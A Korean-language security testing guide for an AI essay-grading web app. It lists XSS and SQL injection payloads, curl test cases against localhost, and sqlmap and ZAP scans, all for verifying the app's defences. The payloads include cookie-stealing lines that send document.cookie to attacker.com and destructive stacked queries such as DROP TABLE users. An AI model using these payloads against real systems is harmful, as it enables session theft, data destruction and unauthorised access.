# XSS and SQL Injection Security Testing Guide

## 목적
AI 논술 평가 시스템에 대한 XSS (Cross-Site Scripting) 및 SQL Injection 공격 방어 메커니즘을 검증합니다.

## 테스트 환경
- **대상 시스템**: AI 논술 평가 시스템
- **보안 강화 사항**:
  - Zod 스키마 검증 (백엔드)
  - DOMPurify XSS 방어 (프론트엔드)
  - Prepared Statements (SQL Injection 방어)
  - Input validation on all endpoints

---

## Part 1: XSS (Cross-Site Scripting) 테스트

### 1.1 Reflected XSS 테스트

#### 테스트 대상
모든 사용자 입력 필드 및 URL 파라미터

#### XSS 공격 페이로드

```javascript
// Basic XSS payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">

// Event handler XSS
<div onclick="alert('XSS')">Click me</div>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>

// Advanced XSS (encoding bypass)
<script>alert(String.fromCharCode(88,83,83))</script>
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">

// DOM-based XSS
<img src=x onerror="this.src='http://attacker.com/?cookie='+document.cookie">
<script>document.location='http://attacker.com/?cookie='+document.cookie</script>

// Obfuscated XSS
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>

// Markdown/HTML injection
[Click me](javascript:alert('XSS'))
[Link](data:text/html,<script>alert('XSS')</script>)
```

#### 테스트 시나리오

**Test Case 1.1.1: 회원가입 Name 필드 XSS**
```bash
curl -X POST http://localhost:3000/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{
    "name": "<script>alert(\"XSS\")</script>",
    "email": "test@example.com",
    "password": "SecurePass123!@#"
  }'
```

**기대 결과**: 
- ✅ Zod 검증 실패: "이름은 한글, 영문, 공백만 사용할 수 있습니다"
- ❌ 스크립트가 실행되지 않아야 함

---

**Test Case 1.1.2: 에세이 텍스트 XSS**
```bash
curl -X POST http://localhost:3000/api/grade \
  -H "Content-Type: application/json" \
  -d '{
    "essay_text": "<img src=x onerror=alert(\"XSS\")>This is my essay.",
    "assignment_prompt": "Write an essay",
    "rubric_criteria": [{"name": "Content", "weight": 100}]
  }'
```

**기대 결과**:
- ✅ 에세이 내용이 저장되지만 HTML 태그가 이스케이프됨
- ❌ 스크립트가 실행되지 않아야 함

---

**Test Case 1.1.3: 과제 제목 XSS**
```bash
# 프론트엔드에서 "새 과제 만들기" 모달 테스트
# 과제 제목 입력:
<svg onload=alert('XSS')>Assignment Title
```

**기대 결과**:
- ✅ DOMPurify가 위험한 태그 제거
- ✅ 제목이 안전하게 표시됨
- ❌ alert가 실행되지 않아야 함

---

### 1.2 Stored XSS 테스트

#### 테스트 시나리오

**Test Case 1.2.1: 저장된 에세이 내용 조회**
```bash
# 1. XSS 페이로드를 포함한 에세이 제출
curl -X POST http://localhost:3000/api/grade \
  -H "Content-Type: application/json" \
  -d '{
    "essay_text": "<script>alert(document.cookie)</script>Stored XSS test",
    "assignment_prompt": "Test",
    "rubric_criteria": [{"name": "Content", "weight": 100}]
  }'

# 2. 에세이 결과 조회
curl http://localhost:3000/api/result/1
```

**기대 결과**:
- ✅ 조회 시 XSS 페이로드가 이스케이프되어 표시
- ❌ 스크립트가 실행되지 않아야 함

---

**Test Case 1.2.2: 사용자 프로필 Stored XSS**
```bash
# 사용자 이름에 XSS 페이로드 시도
curl -X POST http://localhost:3000/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{
    "name": "John<script>alert(1)</script>Doe",
    "email": "john.doe@example.com",
    "password": "SecurePass123!@#"
  }'
```

**기대 결과**:
- ✅ Zod 검증으로 차단됨
- ❌ 회원가입 실패

---

### 1.3 DOM-based XSS 테스트

#### 테스트 시나리오

**Test Case 1.3.1: URL Fragment XSS**
```
# 브라우저에서 직접 테스트
http://localhost:3000/guide#<img src=x onerror=alert('DOM-XSS')>
```

**기대 결과**:
- ✅ URL fragment가 DOM에 안전하게 삽입됨
- ❌ 스크립트가 실행되지 않아야 함

---

## Part 2: SQL Injection 테스트

### 2.1 Classic SQL Injection

#### SQL Injection 페이로드

```sql
-- Authentication bypass
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
admin'#
' OR 1=1--
' OR 1=1#
' OR 1=1/*

-- Union-based injection
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--

-- Boolean-based blind injection
' AND 1=1--
' AND 1=2--
' AND (SELECT COUNT(*) FROM users)>0--

-- Time-based blind injection
' AND SLEEP(5)--
' OR IF(1=1,SLEEP(5),0)--
'; WAITFOR DELAY '00:00:05'--

-- Stacked queries
'; DROP TABLE users--
'; DELETE FROM users WHERE 1=1--
'; UPDATE users SET password='hacked'--

-- Comment injection
admin'-- -
admin'#
admin'/*
```

#### 테스트 시나리오

**Test Case 2.1.1: 로그인 인증 우회**
```bash
# SQL Injection 시도
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@example.com'\'' OR '\''1'\''='\''1",
    "password": "anything"
  }'
```

**기대 결과**:
- ✅ Zod 이메일 검증 실패
- ✅ Prepared Statements로 인해 SQL Injection 불가능
- ❌ 로그인 실패

---

**Test Case 2.1.2: 이메일 필드 SQL Injection**
```bash
curl -X POST http://localhost:3000/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Test User",
    "email": "test@example.com'\'' UNION SELECT * FROM users--",
    "password": "SecurePass123!@#"
  }'
```

**기대 결과**:
- ✅ Zod 이메일 형식 검증 실패
- ❌ 회원가입 실패

---

**Test Case 2.1.3: 에세이 ID 파라미터 SQLi**
```bash
# URL 파라미터에 SQL Injection 시도
curl "http://localhost:3000/api/result/1' OR '1'='1"
```

**기대 결과**:
- ✅ 파라미터가 정수로 파싱되어 SQLi 불가능
- ✅ Prepared Statements 사용으로 안전
- ❌ 에러 또는 빈 결과 반환

---

### 2.2 Second-Order SQL Injection

#### 테스트 시나리오

**Test Case 2.2.1: 사용자 이름에 SQL 페이로드 삽입 후 조회**
```bash
# 1. SQL 페이로드를 포함한 사용자 생성
curl -X POST http://localhost:3000/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Admin'\'' OR '\''1'\''='\''1",
    "email": "attacker@example.com",
    "password": "SecurePass123!@#"
  }'

# 2. 사용자 프로필 조회 (이름이 쿼리에 사용될 경우)
curl -H "Cookie: session_id=YOUR_SESSION_ID" \
  http://localhost:3000/api/user/profile
```

**기대 결과**:
- ✅ Zod 검증으로 특수문자 포함 이름 차단
- ✅ 모든 DB 쿼리에 Prepared Statements 사용
- ❌ SQL Injection 불가능

---

### 2.3 NoSQL Injection (해당되는 경우)

프로젝트가 D1 (SQLite)를 사용하므로 NoSQL Injection은 해당 없음.

---

## Part 3: 통합 공격 시나리오

### 3.1 Combined XSS + SQL Injection

#### 테스트 시나리오

**Test Case 3.1.1: 다중 벡터 공격**
```bash
curl -X POST http://localhost:3000/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{
    "name": "<script>alert('\''XSS'\'')</script>'\'' OR '\''1'\''='\''1",
    "email": "test@example.com'\''--",
    "password": "pass<script>alert(1)</script>"
  }'
```

**기대 결과**:
- ✅ 모든 필드에서 검증 실패
- ❌ 회원가입 거부

---

### 3.2 Polyglot Payloads

#### 페이로드
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

#### 테스트 시나리오

**Test Case 3.2.1: Polyglot 페이로드 테스트**
```bash
curl -X POST http://localhost:3000/api/grade \
  -H "Content-Type: application/json" \
  -d '{
    "essay_text": "jaVasCript:/*-/*`/*\\`/*'\''/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "assignment_prompt": "Test",
    "rubric_criteria": [{"name": "Content", "weight": 100}]
  }'
```

**기대 결과**:
- ✅ 에세이 내용 길이 검증 통과 (50,000자 이내)
- ✅ 저장되지만 HTML/JS가 이스케이프됨
- ❌ 스크립트 실행 안 됨

---

## Part 4: 자동화된 스캔

### 4.1 OWASP ZAP 스캔

```bash
# ZAP Docker 사용
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t http://localhost:3000 \
  -r zap_scan_report.html

# 또는 ZAP GUI 사용
# 1. OWASP ZAP 실행
# 2. Automated Scan 선택
# 3. Target: http://localhost:3000
# 4. 스캔 시작
```

### 4.2 SQLMap 자동화 테스트

```bash
# 로그인 엔드포인트 테스트
sqlmap -u "http://localhost:3000/api/auth/login" \
  --data='{"email":"test@example.com","password":"test"}' \
  --method=POST \
  --headers="Content-Type: application/json" \
  --batch \
  --level=5 \
  --risk=3

# 에세이 조회 엔드포인트 테스트
sqlmap -u "http://localhost:3000/api/result/1*" \
  --batch \
  --level=5 \
  --risk=3
```

---

## Part 5: 예상 방어 메커니즘

### 5.1 XSS 방어 계층

| 계층 | 방어 메커니즘 | 구현 |
|------|-------------|------|
| **Input Validation** | Zod 스키마 검증 | ✅ 구현됨 |
| **Output Encoding** | DOMPurify 사니타이제이션 | ✅ 구현됨 |
| **CSP Headers** | Content-Security-Policy | ⚠️ 권장사항 |
| **HttpOnly Cookies** | 세션 쿠키 보호 | ✅ 구현됨 |

### 5.2 SQL Injection 방어 계층

| 계층 | 방어 메커니즘 | 구현 |
|------|-------------|------|
| **Prepared Statements** | db.prepare().bind() | ✅ 구현됨 |
| **Input Validation** | Zod 타입 검증 | ✅ 구현됨 |
| **Least Privilege** | DB 권한 최소화 | ⚠️ 권장사항 |
| **Error Handling** | 에러 메시지 일반화 | ✅ 구현됨 |

---

## Part 6: 테스트 실행 체크리스트

### XSS 테스트
- [ ] 회원가입/로그인 폼 XSS 테스트
- [ ] 에세이 제출 XSS 테스트
- [ ] 과제 생성 XSS 테스트
- [ ] URL 파라미터 XSS 테스트
- [ ] Stored XSS 테스트
- [ ] DOM-based XSS 테스트
- [ ] OWASP ZAP 자동 스캔

### SQL Injection 테스트
- [ ] 로그인 인증 우회 시도
- [ ] 이메일 필드 SQLi 테스트
- [ ] ID 파라미터 SQLi 테스트
- [ ] UNION-based SQLi 테스트
- [ ] Boolean-based Blind SQLi 테스트
- [ ] Time-based Blind SQLi 테스트
- [ ] SQLMap 자동 스캔

### 통합 테스트
- [ ] Polyglot 페이로드 테스트
- [ ] 다중 벡터 공격 시나리오
- [ ] 경계 조건 테스트 (최대 길이, 특수문자)

---

## Part 7: 보고 및 개선

### 테스트 결과 기록

각 테스트 케이스 실행 후:
1. **결과**: 성공/실패
2. **관찰 사항**: 실제 시스템 동작
3. **취약점 발견 시**: 심각도, 재현 단계, 권장 수정 사항

### 개선 사항

발견된 취약점에 대해:
1. 즉시 수정 (Critical/High)
2. 다음 릴리스에서 수정 (Medium)
3. 백로그에 추가 (Low)

---

## 결론

이 가이드는 AI 논술 평가 시스템의 XSS 및 SQL Injection 방어 메커니즘을 체계적으로 검증하기 위한 것입니다. 모든 테스트 케이스를 실행하고 결과를 문서화하여 시스템의 보안 상태를 평가하시기 바랍니다.

**중요**: 테스트는 반드시 **개발/테스트 환경**에서만 실행하십시오. 프로덕션 환경에서는 실행하지 마십시오.
